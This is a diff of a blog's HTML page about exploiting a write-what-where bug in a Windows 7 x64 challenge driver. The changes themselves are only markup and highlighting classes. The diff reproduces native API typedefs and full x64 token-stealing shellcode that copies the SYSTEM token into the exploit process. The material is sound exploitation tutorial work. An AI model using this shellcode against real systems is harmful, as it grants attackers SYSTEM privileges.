@@ -30,23 +30,21 @@
 
 		    <div class="navbar-collapse collapse" id="navbar-main">
 		      <ul class="nav navbar-nav navbar-right">
-                <li class="active"><a href="/">Home</a></li>
+            <li ><a href="/about.html">About</a></li>
 		        <li><a href="https://twitter.com/DimitriFourny">Twitter</a></li>
-                <li><a href="https://github.com/DimitriFourny">GitHub</a></li>
+            <li><a href="https://github.com/DimitriFourny">GitHub</a></li>
 		        <li><a href="http://fr.linkedin.com/pub/dimitri-fourny/58/283/13a/">Linkedin</a></li>
 		      </ul>
 		    </div>
 		</div>
-	</div>
+  </div>
 
 	<div class="container">
 		
 		<div class="row">
 			<div class="col-sm-12">
-                <h1 id="driver-write-what-where-vulnerability">Driver write-what-where vulnerability</h1>
-<h2 id="introduction">Introduction</h2>
-
-<p>In this article, we will exploit a write-what-where vulnerability in Windows 7 
+        <h1>Driver write-what-where vulnerability </h1>
+        <p>In this article, we will exploit a write-what-where vulnerability in Windows 7 
 x64. To do that, we will use the last level of 
 <a href="https://twitter.com/0vercl0k">0vercl0k</a>: the level 3. We need to do some 
 changes to make a driver which work on a x64 system:</p>
@@ -347,9 +345,9 @@ my process.</p>
     <span class="n">SYSTEM_MODULE</span> <span class="n">Modules</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
 <span class="p">}</span> <span class="n">SYSTEM_MODULE_INFORMATION</span><span class="p">,</span> <span class="o">*</span><span class="n">PSYSTEM_MODULE_INFORMATION</span><span class="p">;</span>
 
-<span class="k">typedef</span> <span class="n">DWORD</span> <span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">_NtQuerySystemInformation</span><span class="p">)(</span><span class="n">SYSTEM_INFORMATION_CLASS</span><span class="p">,</span> <span class="n">PVOID</span><span class="p">,</span> <span class="n">ULONG</span><span class="p">,</span> <span class="n">PULONG</span><span class="p">);</span>
-<span class="k">typedef</span> <span class="n">DWORD</span> <span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">_NtAllocateVirtualMemory</span><span class="p">)(</span><span class="n">HANDLE</span><span class="p">,</span> <span class="n">PVOID</span><span class="o">*</span><span class="p">,</span> <span class="n">ULONG_PTR</span><span class="p">,</span> <span class="n">PSIZE_T</span><span class="p">,</span> <span class="n">ULONG</span><span class="p">,</span> <span class="n">ULONG</span><span class="p">);</span>
-<span class="k">typedef</span> <span class="n">DWORD</span> <span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">_NtQueryIntervalProfile</span><span class="p">)(</span><span class="n">DWORD</span><span class="p">,</span> <span class="n">PULONG</span><span class="p">);</span> 
+<span class="k">typedef</span> <span class="nf">DWORD</span> <span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">_NtQuerySystemInformation</span><span class="p">)(</span><span class="n">SYSTEM_INFORMATION_CLASS</span><span class="p">,</span> <span class="n">PVOID</span><span class="p">,</span> <span class="n">ULONG</span><span class="p">,</span> <span class="n">PULONG</span><span class="p">);</span>
+<span class="k">typedef</span> <span class="nf">DWORD</span> <span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">_NtAllocateVirtualMemory</span><span class="p">)(</span><span class="n">HANDLE</span><span class="p">,</span> <span class="n">PVOID</span><span class="o">*</span><span class="p">,</span> <span class="n">ULONG_PTR</span><span class="p">,</span> <span class="n">PSIZE_T</span><span class="p">,</span> <span class="n">ULONG</span><span class="p">,</span> <span class="n">ULONG</span><span class="p">);</span>
+<span class="k">typedef</span> <span class="nf">DWORD</span> <span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">_NtQueryIntervalProfile</span><span class="p">)(</span><span class="n">DWORD</span><span class="p">,</span> <span class="n">PULONG</span><span class="p">);</span> 
 
 <span class="k">typedef</span> <span class="k">struct</span>
 <span class="p">{</span>
@@ -524,74 +522,74 @@ my process.</p>
 <span class="p">}</span>
 </code></pre></div></div>
 
-<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">format</span> <span class="n">PE64</span> <span class="n">GUI</span> <span class="mi">4</span><span class="p">.</span><span class="mi">0</span>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">format</span> <span class="nv">PE64</span> <span class="nv">GUI</span> <span class="mf">4.0</span>
 
-<span class="n">start</span><span class="o">:</span>
+<span class="nl">start:</span>
 
-<span class="c">; We save the registers</span>
-<span class="k">push</span> <span class="n">rbx</span>
-<span class="k">push</span> <span class="n">rcx</span>
-<span class="k">push</span> <span class="n">rdx</span>
-<span class="k">push</span> <span class="n">rdi</span>
-<span class="k">push</span> <span class="n">rsi</span>
+<span class="c1">; We save the registers</span>
+<span class="nf">push</span> <span class="nb">rbx</span>
+<span class="nf">push</span> <span class="nb">rcx</span>
+<span class="nf">push</span> <span class="nb">rdx</span>
+<span class="nf">push</span> <span class="nb">rdi</span>
+<span class="nf">push</span> <span class="nb">rsi</span>
 
-<span class="c">;--------------------------------</span>
-<span class="c">; 			Stack</span>
-<span class="c">;--------------------------------</span>
-<span class="c">; RSP-8: EPROCESS+0x188 system</span>
-<span class="c">;--------------------------------</span>
-<span class="c">; RSP-4: EPROCESS+0x188 exploit</span>
-<span class="c">;--------------------------------</span>
-<span class="k">push</span> <span class="mh">0xFFFFFFFFFFFFFFFF</span>
-<span class="k">push</span> <span class="mh">0xFFFFFFFFFFFFFFFF</span>
+<span class="c1">;--------------------------------</span>
+<span class="c1">; 			Stack</span>
+<span class="c1">;--------------------------------</span>
+<span class="c1">; RSP-8: EPROCESS+0x188 system</span>
+<span class="c1">;--------------------------------</span>
+<span class="c1">; RSP-4: EPROCESS+0x188 exploit</span>
+<span class="c1">;--------------------------------</span>
+<span class="nf">push</span> <span class="mh">0xFFFFFFFFFFFFFFFF</span>
+<span class="nf">push</span> <span class="mh">0xFFFFFFFFFFFFFFFF</span>
 
-<span class="k">mov</span> <span class="n">rdx</span><span class="p">,</span> <span class="err">[</span><span class="n">gs</span><span class="o">:</span><span class="n">qword</span> <span class="mh">0x188</span><span class="err">]</span>   <span class="c">; +0x180 PrcbData : _KPRCB | +0x008 CurrentThread : _KTHREAD			</span>
-<span class="k">mov</span> <span class="n">rdx</span><span class="p">,</span> <span class="err">[</span><span class="n">rdx</span> <span class="o">+</span> <span class="mh">0x70</span><span class="err">]</span>       <span class="c">; +0x050 ApcState : _KAPC_STATE | +0x020 Process : _KPROCESS</span>
-<span class="k">add</span> <span class="n">rdx</span><span class="p">,</span> <span class="mh">0x188</span>              <span class="c">; +0x188 ActiveProcessLinks : _LIST_ENTRY</span>
-<span class="k">mov</span> <span class="n">rbx</span><span class="p">,</span> <span class="n">rdx</span>                <span class="c">; Our linked list \o/ We save the first structure</span>
+<span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="p">[</span><span class="nb">gs</span><span class="p">:</span><span class="kt">qword</span> <span class="mh">0x188</span><span class="p">]</span>   <span class="c1">; +0x180 PrcbData : _KPRCB | +0x008 CurrentThread : _KTHREAD			</span>
+<span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="p">[</span><span class="nb">rdx</span> <span class="o">+</span> <span class="mh">0x70</span><span class="p">]</span>       <span class="c1">; +0x050 ApcState : _KAPC_STATE | +0x020 Process : _KPROCESS</span>
+<span class="nf">add</span> <span class="nb">rdx</span><span class="p">,</span> <span class="mh">0x188</span>              <span class="c1">; +0x188 ActiveProcessLinks : _LIST_ENTRY</span>
+<span class="nf">mov</span> <span class="nb">rbx</span><span class="p">,</span> <span class="nb">rdx</span>                <span class="c1">; Our linked list \o/ We save the first structure</span>
 
-<span class="n">searchProcess</span><span class="o">:</span>
-<span class="k">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="err">[</span><span class="n">rdx</span> <span class="o">-</span> <span class="mh">0x8</span><span class="err">]</span>        <span class="c">; +0x180 UniqueProcessId</span>
-<span class="k">cmp</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x4</span>                <span class="c">; SYSTEM PID</span>
-<span class="k">je</span> <span class="n">sysProcFound</span>
-<span class="k">mov</span> <span class="n">rcx</span><span class="p">,</span> <span class="mh">0x4141414141414141</span> <span class="c">; Our exploit PID</span>
-<span class="k">cmp</span> <span class="n">rax</span><span class="p">,</span> <span class="n">rcx</span>                <span class="c">; cmp reg64, imm64 don't exist</span>
-<span class="k">je</span> <span class="n">exploitProcFound</span>
+<span class="nl">searchProcess:</span>
+<span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="p">[</span><span class="nb">rdx</span> <span class="o">-</span> <span class="mh">0x8</span><span class="p">]</span>        <span class="c1">; +0x180 UniqueProcessId</span>
+<span class="nf">cmp</span> <span class="nb">rax</span><span class="p">,</span> <span class="mh">0x4</span>                <span class="c1">; SYSTEM PID</span>
+<span class="nf">je</span> <span class="nv">sysProcFound</span>
+<span class="nf">mov</span> <span class="nb">rcx</span><span class="p">,</span> <span class="mh">0x4141414141414141</span> <span class="c1">; Our exploit PID</span>
+<span class="nf">cmp</span> <span class="nb">rax</span><span class="p">,</span> <span class="nb">rcx</span>                <span class="c1">; cmp reg64, imm64 don't exist</span>
+<span class="nf">je</span> <span class="nv">exploitProcFound</span>
  
-<span class="n">nextProcess</span><span class="o">:</span>
-<span class="k">mov</span> <span class="n">rdx</span><span class="p">,</span> <span class="p">[rdx]</span>              <span class="c">; Next process (Flink)</span>
-<span class="k">cmp</span> <span class="n">rdx</span><span class="p">,</span> <span class="n">rbx</span>                <span class="c">; We are back at the starting point</span>
-<span class="k">je</span> <span class="n">retApp</span>
-<span class="k">jmp</span> <span class="n">searchProcess</span>           <span class="c">; We loop!</span>
+<span class="nl">nextProcess:</span>
+<span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="p">[</span><span class="nb">rdx</span><span class="p">]</span>              <span class="c1">; Next process (Flink)</span>
+<span class="nf">cmp</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nb">rbx</span>                <span class="c1">; We are back at the starting point</span>
+<span class="nf">je</span> <span class="nv">retApp</span>
+<span class="nf">jmp</span> <span class="nv">searchProcess</span>           <span class="c1">; We loop!</span>
  
-<span class="n">sysProcFound</span><span class="o">:</span>
-<span class="k">mov</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">8</span><span class="err">]</span><span class="p">,</span> <span class="n">rdx</span>
-<span class="k">jmp</span> <span class="n">allPIDFound</span>
+<span class="nl">sysProcFound:</span>
+<span class="nf">mov</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mi">8</span><span class="p">],</span> <span class="nb">rdx</span>
+<span class="nf">jmp</span> <span class="nb">al</span><span class="nv">lPIDFound</span>
  
-<span class="n">exploitProcFound</span><span class="o">:</span>
-<span class="k">mov</span> <span class="p">[rsp],</span> <span class="n">rdx</span>
+<span class="nl">exploitProcFound:</span>
+<span class="nf">mov</span> <span class="p">[</span><span class="nb">rsp</span><span class="p">],</span> <span class="nb">rdx</span>
  
-<span class="n">allPIDFound</span><span class="o">:</span>
-<span class="k">mov</span> <span class="n">rcx</span><span class="p">,</span> <span class="mh">0xFFFFFFFFFFFFFFFF</span>
-<span class="k">cmp</span> <span class="p">[rsp],</span> <span class="n">rcx</span>
-<span class="k">je</span> <span class="n">nextProcess</span>
-<span class="k">cmp</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">8</span><span class="err">]</span><span class="p">,</span> <span class="n">rcx</span>
-<span class="k">je</span> <span class="n">nextProcess</span>
+<span class="nl">allPIDFound:</span>
+<span class="nf">mov</span> <span class="nb">rcx</span><span class="p">,</span> <span class="mh">0xFFFFFFFFFFFFFFFF</span>
+<span class="nf">cmp</span> <span class="p">[</span><span class="nb">rsp</span><span class="p">],</span> <span class="nb">rcx</span>
+<span class="nf">je</span> <span class="nv">nextProcess</span>
+<span class="nf">cmp</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mi">8</span><span class="p">],</span> <span class="nb">rcx</span>
+<span class="nf">je</span> <span class="nv">nextProcess</span>
 
-<span class="c">; We copy the SYSTEM token</span>
-<span class="k">pop</span> <span class="n">rdi</span> <span class="c">; Exploit</span>
-<span class="k">pop</span> <span class="n">rsi</span> <span class="c">; System</span>
-<span class="k">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="err">[</span><span class="n">rsi</span> <span class="o">+</span> <span class="mh">0x80</span><span class="err">]</span>       <span class="c">; 0x208 - 0x188 = 0x80 | +0x208 Token : _EX_FAST_REF</span>
-<span class="k">mov</span> <span class="err">[</span><span class="n">rdi</span> <span class="o">+</span> <span class="mh">0x80</span><span class="err">]</span><span class="p">,</span> <span class="n">rax</span>
+<span class="c1">; We copy the SYSTEM token</span>
+<span class="nf">pop</span> <span class="nb">rdi</span> <span class="c1">; Exploit</span>
+<span class="nf">pop</span> <span class="nb">rsi</span> <span class="c1">; System</span>
+<span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="p">[</span><span class="nb">rsi</span> <span class="o">+</span> <span class="mh">0x80</span><span class="p">]</span>       <span class="c1">; 0x208 - 0x188 = 0x80 | +0x208 Token : _EX_FAST_REF</span>
+<span class="nf">mov</span> <span class="p">[</span><span class="nb">rdi</span> <span class="o">+</span> <span class="mh">0x80</span><span class="p">],</span> <span class="nb">rax</span>
  
-<span class="n">retApp</span><span class="o">:</span>
-<span class="c">; Restore the registers</span>
-<span class="k">pop</span> <span class="n">rsi</span>
-<span class="k">pop</span> <span class="n">rdi</span>
-<span class="k">pop</span> <span class="n">rdx</span>
-<span class="k">pop</span> <span class="n">rcx</span>
-<span class="k">pop</span> <span class="n">rbx</span>
-<span class="k">ret</span>
+<span class="nl">retApp:</span>
+<span class="c1">; Restore the registers</span>
+<span class="nf">pop</span> <span class="nb">rsi</span>
+<span class="nf">pop</span> <span class="nb">rdi</span>
+<span class="nf">pop</span> <span class="nb">rdx</span>
+<span class="nf">pop</span> <span class="nb">rcx</span>
+<span class="nf">pop</span> <span class="nb">rbx</span>
+<span class="nf">ret</span>
 </code></pre></div></div>
 
 			</div>
